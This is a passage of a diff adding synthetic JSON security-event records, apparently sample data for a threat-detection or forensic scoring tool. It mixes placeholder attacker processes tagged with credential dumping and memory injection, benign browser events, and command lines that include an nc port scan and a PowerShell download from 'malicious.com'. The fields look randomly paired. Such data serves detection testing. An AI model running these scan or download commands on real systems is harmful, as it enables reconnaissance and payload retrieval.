+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2045",
+    "ppid": "1545",
+    "tags": [
+      "unauthorized_usb",
+      "suspicious_process_hollowing",
+      "mfa_bypass",
+      "credential_dumping",
+      "registry_persistence",
+      "memory_injection"
+    ],
+    "risk_score": 89,
+    "timestamp": "2025-06-10T02:33:47.304236",
+    "event_id": "742ea07c-e160-4c43-94df-2b621b2d8697",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2046",
+    "ppid": "1546",
+    "tags": [
+      "suspicious_process_hollowing",
+      "shadow_copy_deletion",
+      "unauthorized_usb",
+      "mfa_bypass",
+      "cloud_instance_metadata_access",
+      "registry_persistence"
+    ],
+    "risk_score": 90,
+    "timestamp": "2025-06-10T02:34:17.304236",
+    "event_id": "17440cec-8dc5-487d-9fc9-a0d15afb2db3",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2047",
+    "ppid": "1547",
+    "tags": [
+      "suspicious_process_hollowing",
+      "shadow_copy_deletion",
+      "registry_persistence"
+    ],
+    "risk_score": 81,
+    "timestamp": "2025-06-10T02:34:47.304236",
+    "event_id": "a2691949-8d32-43fd-beb1-f4bfd97d5df5",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2048",
+    "ppid": "1548",
+    "tags": [
+      "shadow_copy_deletion",
+      "memory_injection",
+      "suspicious_process_hollowing",
+      "unauthorized_usb"
+    ],
+    "risk_score": 83,
+    "timestamp": "2025-06-10T02:35:17.304236",
+    "event_id": "343e9818-dca7-4a74-a9e2-84cd65655d75",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2049",
+    "ppid": "1549",
+    "tags": [
+      "suspicious_process_hollowing",
+      "cloud_instance_metadata_access",
+      "memory_injection",
+      "shadow_copy_deletion"
+    ],
+    "risk_score": 100,
+    "timestamp": "2025-06-10T02:35:47.304236",
+    "event_id": "182636ba-e44e-44d7-923d-7a143910dac4",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3000",
+    "ppid": "2500",
+    "tags": [
+      "scheduled_backup",
+      "normal_logon",
+      "approved_update"
+    ],
+    "risk_score": 10,
+    "timestamp": "2025-06-10T02:11:17.304236",
+    "event_id": "f7f0f639-0552-4998-aefd-3995fa24832b",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3001",
+    "ppid": "2501",
+    "tags": [
+      "approved_update",
+      "normal_logon",
+      "standard_browser_use"
+    ],
+    "risk_score": 4,
+    "timestamp": "2025-06-10T02:12:02.304236",
+    "event_id": "faea42a0-553d-46cc-aa24-95ee5ccd935c",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3002",
+    "ppid": "2502",
+    "tags": [
+      "standard_browser_use"
+    ],
+    "risk_score": 6,
+    "timestamp": "2025-06-10T02:12:47.304236",
+    "event_id": "ff045f6e-cfbb-4445-8db1-29e03eef6481",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3003",
+    "ppid": "2503",
+    "tags": [
+      "standard_browser_use",
+      "scheduled_backup"
+    ],
+    "risk_score": 2,
+    "timestamp": "2025-06-10T02:13:32.304236",
+    "event_id": "7ed8a853-1d1a-4861-bae7-6ac6a7cdbc21",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3004",
+    "ppid": "2504",
+    "tags": [
+      "normal_logon",
+      "standard_browser_use"
+    ],
+    "risk_score": 1,
+    "timestamp": "2025-06-10T02:14:17.304236",
+    "event_id": "61ac0439-368e-4f17-a113-1b6e8c331b98",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3005",
+    "ppid": "2505",
+    "tags": [
+      "normal_logon",
+      "scheduled_backup"
+    ],
+    "risk_score": 10,
+    "timestamp": "2025-06-10T02:15:02.304236",
+    "event_id": "181390ea-00c1-4724-86cf-994da723f23d",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3006",
+    "ppid": "2506",
+    "tags": [
+      "approved_update",
+      "scheduled_backup"
+    ],
+    "risk_score": 6,
+    "timestamp": "2025-06-10T02:15:47.304236",
+    "event_id": "e7477e3e-2a78-45d5-b114-18f101d2e663",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3007",
+    "ppid": "2507",
+    "tags": [
+      "scheduled_backup"
+    ],
+    "risk_score": 2,
+    "timestamp": "2025-06-10T02:16:32.304236",
+    "event_id": "09b58b09-4cac-4ad6-88ae-9d2a12197d5f",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3008",
+    "ppid": "2508",
+    "tags": [
+      "standard_browser_use",
+      "scheduled_backup"
+    ],
+    "risk_score": 7,
+    "timestamp": "2025-06-10T02:17:17.304236",
+    "event_id": "1f0f6e6f-6808-4ce2-93cb-b06cabbd289d",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3009",
+    "ppid": "2509",
+    "tags": [
+      "standard_browser_use"
+    ],
+    "risk_score": 7,
+    "timestamp": "2025-06-10T02:18:02.304236",
+    "event_id": "5b656771-4ddd-48d6-9b1c-d8ced6cedaa0",
+    "session_id": "session_benign_0",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3010",
+    "ppid": "2510",
+    "tags": [
+      "scheduled_backup",
+      "approved_update",
+      "standard_browser_use"
+    ],
+    "risk_score": 6,
+    "timestamp": "2025-06-10T02:18:47.304236",
+    "event_id": "9f888bf9-25ef-4c8d-95cb-caf9ebfa1568",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3011",
+    "ppid": "2511",
+    "tags": [
+      "normal_logon",
+      "approved_update"
+    ],
+    "risk_score": 2,
+    "timestamp": "2025-06-10T02:19:32.304236",
+    "event_id": "c1eb161a-287a-452a-bd44-6bd399666477",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3012",
+    "ppid": "2512",
+    "tags": [
+      "normal_logon",
+      "scheduled_backup"
+    ],
+    "risk_score": 10,
+    "timestamp": "2025-06-10T02:20:17.304236",
+    "event_id": "8a0f6cfd-ea60-499a-b3e3-c54135ea6cb4",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3013",
+    "ppid": "2513",
+    "tags": [
+      "normal_logon"
+    ],
+    "risk_score": 5,
+    "timestamp": "2025-06-10T02:21:02.304236",
+    "event_id": "638673da-ada7-487e-b4b6-969c5ae6185a",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3014",
+    "ppid": "2514",
+    "tags": [
+      "normal_logon",
+      "scheduled_backup"
+    ],
+    "risk_score": 9,
+    "timestamp": "2025-06-10T02:21:47.304236",
+    "event_id": "bc02fd67-c0bf-4eb0-8746-e9761974f8c5",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3015",
+    "ppid": "2515",
+    "tags": [
+      "normal_logon"
+    ],
+    "risk_score": 7,
+    "timestamp": "2025-06-10T02:22:32.304236",
+    "event_id": "cb84abcf-1dbf-4f8a-aad9-c58f0fa9ff13",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3016",
+    "ppid": "2516",
+    "tags": [
+      "normal_logon",
+      "scheduled_backup"
+    ],
+    "risk_score": 9,
+    "timestamp": "2025-06-10T02:23:17.304236",
+    "event_id": "a40d646c-1525-43d9-a7e4-a0e7749039ae",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3017",
+    "ppid": "2517",
+    "tags": [
+      "standard_browser_use"
+    ],
+    "risk_score": 9,
+    "timestamp": "2025-06-10T02:24:02.304236",
+    "event_id": "24d78c55-72ff-42ea-9c68-e005b4787727",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3018",
+    "ppid": "2518",
+    "tags": [
+      "standard_browser_use"
+    ],
+    "risk_score": 8,
+    "timestamp": "2025-06-10T02:24:47.304236",
+    "event_id": "ced660e4-a663-4178-9325-0ef6e7b069ec",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3019",
+    "ppid": "2519",
+    "tags": [
+      "standard_browser_use"
+    ],
+    "risk_score": 2,
+    "timestamp": "2025-06-10T02:25:32.304236",
+    "event_id": "82dc8588-2e2c-4190-a74b-79daa55d350c",
+    "session_id": "session_benign_1",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3020",
+    "ppid": "2520",
+    "tags": [
+      "approved_update",
+      "standard_browser_use"
+    ],
+    "risk_score": 1,
+    "timestamp": "2025-06-10T02:26:17.304236",
+    "event_id": "81ea4951-839a-4b4b-8ed6-b83df6eb53d0",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3021",
+    "ppid": "2521",
+    "tags": [
+      "normal_logon",
+      "approved_update",
+      "scheduled_backup"
+    ],
+    "risk_score": 7,
+    "timestamp": "2025-06-10T02:27:02.304236",
+    "event_id": "de6fd06e-ec00-4314-a538-899c28fea602",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3022",
+    "ppid": "2522",
+    "tags": [
+      "approved_update"
+    ],
+    "risk_score": 7,
+    "timestamp": "2025-06-10T02:27:47.304236",
+    "event_id": "1f04b6ae-dab8-4319-8241-10b4323598c2",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3023",
+    "ppid": "2523",
+    "tags": [
+      "approved_update",
+      "standard_browser_use",
+      "scheduled_backup"
+    ],
+    "risk_score": 6,
+    "timestamp": "2025-06-10T02:28:32.304236",
+    "event_id": "773780c1-4d37-4c08-9574-4da1195acd20",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3024",
+    "ppid": "2524",
+    "tags": [
+      "scheduled_backup"
+    ],
+    "risk_score": 6,
+    "timestamp": "2025-06-10T02:29:17.304236",
+    "event_id": "487a830f-8b01-45fc-b6c2-02b5d5c025ce",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3025",
+    "ppid": "2525",
+    "tags": [
+      "scheduled_backup"
+    ],
+    "risk_score": 4,
+    "timestamp": "2025-06-10T02:30:02.304236",
+    "event_id": "13dc7cd3-36c9-438f-b8f9-0eb736980336",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3026",
+    "ppid": "2526",
+    "tags": [
+      "normal_logon"
+    ],
+    "risk_score": 5,
+    "timestamp": "2025-06-10T02:30:47.304236",
+    "event_id": "fc6ac6bc-e46a-45c2-8857-86552cccd880",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3027",
+    "ppid": "2527",
+    "tags": [
+      "approved_update",
+      "scheduled_backup",
+      "standard_browser_use"
+    ],
+    "risk_score": 10,
+    "timestamp": "2025-06-10T02:31:32.304236",
+    "event_id": "32c1f8b0-7e59-4ac3-94b8-02c3c49f2924",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_0",
+    "pid": "3028",
+    "ppid": "2528",
+    "tags": [
+      "normal_logon"
+    ],
+    "risk_score": 5,
+    "timestamp": "2025-06-10T02:32:17.304236",
+    "event_id": "ef3e3eec-4066-42a7-95e4-6f0f6d76919b",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_type": "minimal",
+    "exe": "/Applications/Safari.app/Contents/MacOS/Safari",
+    "cmdline": "/Applications/Safari.app/Contents/MacOS/Safari --safe-mode",
+    "user": "normal_user_1",
+    "pid": "3029",
+    "ppid": "2529",
+    "tags": [
+      "approved_update",
+      "standard_browser_use",
+      "normal_logon"
+    ],
+    "risk_score": 10,
+    "timestamp": "2025-06-10T02:33:02.304236",
+    "event_id": "39a8497d-6570-4178-8c81-dcb1c3c4743d",
+    "session_id": "session_benign_2",
+    "mode": "minimal"
+  },
+  {
+    "event_id": "5e1a6352-59da-48b5-8072-9cbb4b640022",
+    "timestamp": "2025-06-09T15:24:18.020314Z",
+    "user": "alice",
+    "exe": "python.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "4534",
+    "ppid": "941",
+    "tags": [
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.37,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "093cc2ea-ecf4-4066-ab08-6d2b3378a531",
+    "timestamp": "2025-06-09T17:54:18.020537Z",
+    "user": "admin",
+    "exe": "/usr/bin/nc",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "4827",
+    "ppid": "583",
+    "tags": [
+      "suspicious_clipboard_usage",
+      "internal_port_scan",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.31,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage",
+      "internal_port_scan",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "c44eb819-6b47-4cdc-8fc6-6742fa08592f",
+    "timestamp": "2025-06-09T06:42:18.020600Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "4411",
+    "ppid": "800",
+    "tags": [
+      "hidden_window",
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.58,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "0be0de3c-a6d7-40d1-970d-79415db63ccc",
+    "timestamp": "2025-06-09T11:23:18.020654Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "svchost.exe /service",
+    "pid": "3122",
+    "ppid": "449",
+    "tags": [
+      "nmap",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.75,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "7f151324-df00-49af-9b9e-4b0825df51ca",
+    "timestamp": "2025-06-09T20:43:18.020706Z",
+    "user": "alice",
+    "exe": "python.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "8309",
+    "ppid": "194",
+    "tags": [
+      "script_exec",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "030ee109-2c7a-4796-a5cd-577ee7291067",
+    "timestamp": "2025-06-09T22:22:18.020756Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "9106",
+    "ppid": "699",
+    "tags": [
+      "script_exec",
+      "hidden_window",
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.4,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "hidden_window",
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "f421c248-3ac9-43bc-a2d3-317640822677",
+    "timestamp": "2025-06-09T20:19:18.020804Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "9764",
+    "ppid": "233",
+    "tags": [
+      "hidden_window",
+      "doc_opened"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.44,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "doc_opened"
+    ]
+  },
+  {
+    "event_id": "217f783d-f97b-4c6a-8123-61b5f632f843",
+    "timestamp": "2025-06-09T06:51:18.020871Z",
+    "user": "alice",
+    "exe": "python.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "1319",
+    "ppid": "789",
+    "tags": [
+      "hidden_window",
+      "internal_port_scan",
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.77,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "internal_port_scan",
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "097686b1-157d-492c-a461-de16189b398d",
+    "timestamp": "2025-06-09T14:38:18.020951Z",
+    "user": "bob",
+    "exe": "/bin/bash",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "6609",
+    "ppid": "321",
+    "tags": [
+      "internal_port_scan",
+      "suspicious_clipboard_usage",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.78,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "suspicious_clipboard_usage",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "09d58dc0-45f9-488c-891d-c659bc1a2d5d",
+    "timestamp": "2025-06-09T06:34:18.020999Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "svchost.exe /service",
+    "pid": "4828",
+    "ppid": "891",
+    "tags": [
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.89,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "bcd88b0c-04fa-4421-a648-0aef798c26c1",
+    "timestamp": "2025-06-09T10:48:18.021054Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "2436",
+    "ppid": "945",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.89,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "5d8d6984-33f4-43fe-a4f6-f2af136486a0",
+    "timestamp": "2025-06-09T13:32:18.021097Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "5721",
+    "ppid": "897",
+    "tags": [
+      "internal_port_scan",
+      "cloud_console",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.41,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "cloud_console",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "ca2489ab-dc55-421e-95c2-c4d9d289c84e",
+    "timestamp": "2025-06-09T04:48:18.021140Z",
+    "user": "admin",
+    "exe": "powershell.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "4502",
+    "ppid": "910",
+    "tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.74,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "062e0e28-8973-4ade-81da-7ccade4c0da2",
+    "timestamp": "2025-06-09T17:37:18.021192Z",
+    "user": "charlie",
+    "exe": "svchost.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "2103",
+    "ppid": "612",
+    "tags": [
+      "auth_attempt",
+      "hostname_enum",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.55,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "auth_attempt",
+      "hostname_enum",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "0c7f1c0d-ce4d-4009-8372-24048806764f",
+    "timestamp": "2025-06-09T19:47:18.021238Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "3104",
+    "ppid": "406",
+    "tags": [
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.31,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "edc1a4c4-1c9f-49bc-83e9-1123f8f8ce47",
+    "timestamp": "2025-06-09T09:57:18.021284Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "2561",
+    "ppid": "528",
+    "tags": [
+      "cloud_console",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.74,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "f1d19767-a000-46c8-8941-e5bdfee2b6de",
+    "timestamp": "2025-06-09T22:20:18.021328Z",
+    "user": "charlie",
+    "exe": "/bin/bash",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "8462",
+    "ppid": "342",
+    "tags": [
+      "nmap",
+      "suspicious_clipboard_usage",
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.61,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "suspicious_clipboard_usage",
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "7d0aa964-52fe-4385-bbfe-edf0322b01bd",
+    "timestamp": "2025-06-10T00:23:18.021385Z",
+    "user": "charlie",
+    "exe": "/usr/bin/nc",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "2395",
+    "ppid": "750",
+    "tags": [
+      "doc_opened",
+      "internal_port_scan",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.6,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "internal_port_scan",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "1781ca2e-61f5-4a49-bcb4-28c9ce65fa87",
+    "timestamp": "2025-06-09T14:41:18.021430Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "9069",
+    "ppid": "321",
+    "tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.62,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "suspicious_clipboard_usage",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "73689a6b-8b3f-4c34-9ca1-7cdb6f5d64d7",
+    "timestamp": "2025-06-10T02:17:18.021473Z",
+    "user": "alice",
+    "exe": "python.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "5762",
+    "ppid": "844",
+    "tags": [
+      "doc_opened",
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.91,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "481e41c0-435e-4b36-a255-f96bf160ce45",
+    "timestamp": "2025-06-09T22:42:18.021517Z",
+    "user": "bob",
